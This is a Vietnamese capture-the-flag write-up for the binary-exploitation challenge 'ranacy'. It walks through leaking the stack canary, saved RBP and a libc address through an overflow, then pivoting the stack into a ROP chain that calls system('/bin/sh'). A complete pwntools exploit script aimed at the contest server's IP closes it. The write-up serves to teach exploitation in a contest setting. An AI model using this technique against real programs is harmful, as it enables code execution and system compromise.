# ranacy---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài ranacy của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 15/12/2025

## 1. Mục tiêu cần làm
Bài này gần như là full các lớp bảo vệ

<img width="1441" height="251" alt="image" src="https://github.com/user-attachments/assets/7f7de040-ce89-435d-a142-d2312dd3f519" />

Vì bài này có `SHSKT` nên chúng ta không thể ghi đè saved RIP bằng địa chỉ để đi tới đó nên chúng ta sẽ xài 1 cách khác là **Stack Pivot**. Vì bài này chúng ta có thể thực thi các lệnh ở trên stack nên chúng ta sẽ chơi **ROPchain**.

Giờ mục tiêu chúng ta ban đầu là leak **Canary**, sau đó leak **Stack RBP** để **Stack Pivot**. Cuối cùng là leak **Libc**. Tại sao phải leak **Libc** ? Vì bài này cần **ROPchain** mà các lệnh **rop** trong `ranacy` khá ít và hầu như không xài được nên chúng ta sẽ xài **rop** bên **Libc**.

## 2. Cách thực thi
Đầu tiên chúng ta phải xem bài này xảy ra lỗi ở đâu.

```C
unsigned __int64 vuln()
{
  int v1; // [rsp+8h] [rbp-118h] BYREF
  int i; // [rsp+Ch] [rbp-114h]
  char buf[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+118h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  set_up(buf);
  for ( i = 0; i <= 4; ++i )
  {
    menu();
    __isoc99_scanf("%d", &v1);
    switch ( v1 )
    {
      case 1:
        printf("Please enter some data:\n> ");
        read(0, buf, 0x120uLL);
        break;
      case 2:
        printf("Starting data observation...\nData: %s\n", buf);
        break;
      case 3:
        puts("Processing your request...");
        return v4 - __readfsqword(0x28u);
      default:
        puts("Invalid choice, please try again.");
        break;
    }
  }
  return v4 - __readfsqword(0x28u);
}
```

Ta có lỗi **Buffer Overflow** ở biến `buf`, sau đó gặp thêm 1 lỗi nữa ở lệnh `print`. Như các bạn biến thì `print` thì nó sẽ in hết cho đến khi gặp byte `null` ( `b\x00` ) thì dừng. Nếu vậy thì ví dụ stack không có bất cứ byte `null` nào thì ta có thể in hết tất cả giá trị trên stack ra.

Chúng ta hãy leak 2 cái dễ nhất là `Canary` và `Stack RBP`, 2 thằng này nằm kế bên nên rất dễ leak, chưa kể thằng `Stack RBP` byte thấp nó không chứa `null` mà chỉ có 2 byte cao có `null`. Đồng nghĩa nếu ta ghi đè 1 byte `null` của `Canary` thì vô tình ra sẽ in ra `Canary` + `Stack RBP` luôn.

Giờ tìm offset làm sao đây. Hãy mở gdb lên và sau đó các bạn hãy đặt breakpoint tại vuln và r. Tiếp đó đặt breakpoint đằng sau `read` để xem stack thay đổi như nào.

<img width="774" height="793" alt="image" src="https://github.com/user-attachments/assets/27faf578-dab3-4af8-a13c-cad2e3808750" />

Mình đã nhập `AA` vào nên đầu stack nó sẽ là `0x0..4141`. Nhìn sơ qua là thấy luôn `Canary`, nó nằm ở `0x7fffffffde50`, dưới đó là `Stack RBP` là `0x7fffffffde60`. Vậy offset để đè byte `null` của `Canary` là 

<img width="634" height="80" alt="image" src="https://github.com/user-attachments/assets/2a629a2f-8fb1-4a4b-bf40-cfcacb0355a9" />

Phải + 8 vì nó nằm bên phải. Giờ thì hãy tạo 1 payload để leak thôi

```Python
p.sendlineafter(b'> ', b'1')
p.sendafter(b'> ', b'A' * 265) 

p.sendlineafter(b'> ', b'2')
p.recvuntil(b'A' * 265)
leaked_data = p.recv(13)
if len(leaked_data) < 13:
    log.critical("Leak data failed!")
    sys.exit()

canary = u64(b'\x00' + leaked_data[:7])
leak_rbp = u64(leaked_data[7:13] + b'\x00\x00')

log.success(f'Canary: {hex(canary)}')
log.success(f'RBP Val: {hex(leak_rbp)}')
```

Mình kiểm tra thử xem mình có nhận đủ 13 byte không vì lâu lâu có vài trường hợp nó vô tình nhận luôn menu của chương trình.

Sau khi có được `Canary` và `Stack RBP` thì ta sẽ leak `Libc`. Vẫn ở stack cũ mình đã gửi, các bạn có thấy `Libc` không ? Nó nằm ở `0x7fffffffde70`, và bất ngờ không, tác giả có lẽ cố tình để 8 byte đầu ở địa chỉ `0x7fffffffde70` bằng `space` để print không bị dừng lại. Vậy nếu ta ghi đè hết 288 byte thì print sẽ in ra luôn `Libc`. Chúng ta chỉ việc nhận và tìm offset để tính `Libc Base` thôi.

```Python
p.sendline(b'1')
p.sendafter(b'> ', b'A' * 288)

p.sendlineafter(b'> ', b'2')
p.recvuntil(b'A' * 288)
p.recv(8) 
leak_raw = u64(p.recv(6) + b'\x00\x00')
```

Giờ làm sao tìm offset đây ? Bài này các bạn không thể tìm offset trong gdb ở local và xài được đâu vì trên server nó sẽ sai. Đó là lí do vì sao tác giả đã cho chúng ta `Dockerfile` để ta chạy. Hãy build `Dockerfile` và nó sẽ tạo ra `libc_docker.so.6`. Đây mới là file `libc` của server.

Giờ là khúc tính offset nè. Khi chạy thử ta thấy `Libc Raw` nó sẽ luôn in ra với đuôi là `d90`.

<img width="770" height="96" alt="image" src="https://github.com/user-attachments/assets/e6ad8ed3-6c58-4b22-944f-9f2798838360" />

Mà `Libc` luôn có 3 bit thấp là `000`. Vi vậy, offset của địa chỉ này trong file `Libc` cũng phải kết thúc bằng `0xd90`.

Mình sử dụng objdump để tìm các chỉ dẫn lệnh tại offset kết thúc bằng `d90` trong file `libc_docker.so.6`. Gõ lệnh `objdump -d libc_docker.so.6 | grep "d90:"`

<img width="699" height="81" alt="image" src="https://github.com/user-attachments/assets/ccaee81e-e8e4-40cf-87bc-82d913f13ebc" />

Tại offset `0x29d90`, mình thấy lệnh `mov %eax, %edi` nằm ngay sau lệnh `call *%rax`. Đây là mẫu code (pattern) đặc trưng của hàm khởi tạo __libc_start_call_main khi nó gọi hàm `main`. vậy suy ra `0x29d90` chính là offset từ `Base` đến địa chỉ `Return` của `main`.

Vậy là ta đã có `Libc Base` rồi. Giờ tới đoạn viết **ROPchain** và **Stack Pivot**. ROPchain thì khá đơn giản, đầu tiên tạo 1 ROPchain để thực thi `system(/bin/sh)`.

```Python
rop_chain = flat(
    p64(pop_rdi),
    p64(bin_sh),
    p64(system)
)
```

Sau đó tạo 1 đoạn để **Stack Pivot** là xong

```Python
payload = flat(
    rop_chain,
    b'A' * (264 - len(rop_chain)),
    p64(canary),
    p64(buf_addr - 8), # Fake RBP
    p64(leave_ret)     # Pivot Gadget
)
```

Cách hoạt động : để lừa CPU chuyển sang Stack mới, chúng ta lợi dụng 2 lệnh `LEAVE` liên tiếp.

**Nhịp 1: Lệnh `LEAVE` của hàm vuln ( Hàm Main trả về )**
Khi hàm vuln chạy xong, nó tự động gọi:
1. `mov rsp, rbp` : Kéo RSP về đáy stack cũ ( đang trỏ vào Saved RBP ).
2. `pop rbp`:
- Lấy giá trị tại đó đưa vào thanh ghi `RBP`.
- Giá trị đó chính là `FAKE RBP` bạn đã ghi đè ( buf_addr - 8 ).
- Kết quả: Bây giờ `RBP` đang trỏ về sát đầu Buffer của bạn.

3. `ret`:
- Lấy giá trị tiếp theo đưa vào `RIP`.
- Giá trị đó là Gadget `LEAVE; RET`.

=> Trạng thái lúc này:
- `RBP` = buf_addr - 8
- `RIP` = đang chạy lệnh `LEAVE` (của gadget).

**Nhịp 2: Lệnh `LEAVE` của Gadget**
CPU thực hiện lệnh `LEAVE` lần thứ 2 ( do bạn điều hướng tới ):
1. `mov rsp, rbp`:
- `RSP` nhảy tót về vị trí của `RBP`.
- Tức là `RSP` bây giờ bằng `buf_addr - 8`.
2. `pop rbp`:
- Lấy 8 byte rác tại `buf_addr - 8` vứt vào `RBP`  ( ta không quan tâm giá trị này ).
- Khi `pop`, `RSP` tự động tăng lên 8 byte.
- `buf_addr - 8 + 8` = `buf_addr`.

=> Kết quả thần kỳ: `RSP` bây giờ đang trỏ đúng vào đầu `Buffer` ( buf_addr ).

Vậy là sau khi chuyển hướng lại về `buf_addr` nơi ta nạp sẵn đạn `system(/bin/sh)`, nó sẽ thực thi và bắn ra flag cho chúng ta.

<img width="720" height="703" alt="image" src="https://github.com/user-attachments/assets/5e51e41b-005f-4c9c-a7e6-7c170d7c955e" />

Thế là xong bài **ranacy**. Theo mình đánh giá có lẽ bài này ở mức độ 3-4 ở DreamHack hoặc cao hơn. Đếch quan tâm dù sao thì chúc các bạn ra flag như mình. Hãy cho mình 1 star để có động lực viết tiếp nha 🐧.

<img width="1027" height="136" alt="image" src="https://github.com/user-attachments/assets/390c3a13-3144-46f8-8f21-dd1fe74bde4f" />

Vì vấn đề bảo mật nên mình sẽ giấu danh tính cho nó.

## 3. Exploit
```Python
from pwn import *

# 1. Config
context.arch = 'amd64'
LIBC_PATH = './libc_docker.so.6'
libc = ELF(LIBC_PATH, checksec=False)

p = remote('67.223.119.69', 5006)

# 2. Leak Canary & RBP
p.sendlineafter(b'> ', b'1')
p.sendafter(b'> ', b'A' * 265) 

p.sendlineafter(b'> ', b'2')
p.recvuntil(b'A' * 265)
leaked_data = p.recv(13)

if len(leaked_data) < 13:
    log.critical("Leak data failed!")
    sys.exit()

canary = u64(b'\x00' + leaked_data[:7])
leak_rbp = u64(leaked_data[7:13] + b'\x00\x00')

log.success(f'Canary: {hex(canary)}')
log.success(f'RBP Val: {hex(leak_rbp)}')

buf_addr = leak_rbp - 0x120
p.recvuntil(b'> ') 

# 3. Leak Libc
p.sendline(b'1')
p.sendafter(b'> ', b'A' * 288)

p.sendlineafter(b'> ', b'2')
p.recvuntil(b'A' * 288)
p.recv(8) 
leak_raw = u64(p.recv(6) + b'\x00\x00')

libc.address = leak_raw - 0x29d90
log.success(f"Libc Raw : {hex(leak_raw)}")
log.success(f"Libc Base : {hex(libc.address)}")

# 4. Payload & Stack Pivot
pop_rdi = next(libc.search(asm('pop rdi; ret'), executable=True))
leave_ret = next(libc.search(asm('leave; ret'), executable=True))
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

rop_chain = flat(
    p64(pop_rdi),
    p64(bin_sh),
    p64(system)
)

payload = flat(
    rop_chain,
    b'A' * (264 - len(rop_chain)),
    p64(canary),
    p64(buf_addr - 8), # Fake RBP
    p64(leave_ret)     # Pivot Gadget
)

p.sendlineafter(b'> ', b'1')
p.sendafter(b'> ', payload)

p.interactive()
```
